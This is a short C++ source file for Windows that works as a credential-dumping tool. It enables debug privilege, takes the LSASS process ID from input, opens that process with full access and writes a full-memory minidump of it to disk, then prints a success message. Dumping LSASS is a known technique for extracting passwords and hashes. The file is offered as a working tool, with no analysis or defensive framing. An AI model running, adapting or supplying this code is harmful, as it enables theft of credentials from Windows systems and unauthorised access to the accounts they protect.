
#include <windows.h>
#include <DbgHelp.h>
#include <iostream>
#include <TlHelp32.h>
#include <dbghelp.h>
#include <tchar.h>



#pragma comment (lib, "dbghelp.lib")
bool EnableDebugPrivilege()
{
	HANDLE hToken;
	LUID sedebugnameValue;
	TOKEN_PRIVILEGES tkp;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		return   FALSE;

	}
	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue))
	{
		CloseHandle(hToken);
		return false;

	}
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = sedebugnameValue;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
	{
		CloseHandle(hToken);
		return false;

	}

	return true;
}

int main() {

	EnableDebugPrivilege();


	DWORD lsassPID;
	std::cin >> lsassPID;
	const DWORD Flags = MiniDumpWithFullMemory |
		MiniDumpWithFullMemoryInfo |
		MiniDumpWithHandleData |
		MiniDumpWithUnloadedModules |
		MiniDumpWithThreadInfo;
	HANDLE lsassHandle = NULL;
	HANDLE hFile = CreateFile(L"C:\\xfiles\\Lsass\\x64\\Debug\\main.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);
	LPCWSTR processName = L"";
	

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);

	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, hFile, (MINIDUMP_TYPE)Flags, NULL, NULL, NULL);
	
	if (isDumped) {
		std::cout << "[+] lsass dumped successfully!" << std::endl;
	}
	else {
		std::cout << "[-] lsass was not dumped !" << std::endl;
		std::cout << GetLastError() << std::endl;
	}
	system("PAUSE");

	return 0;
}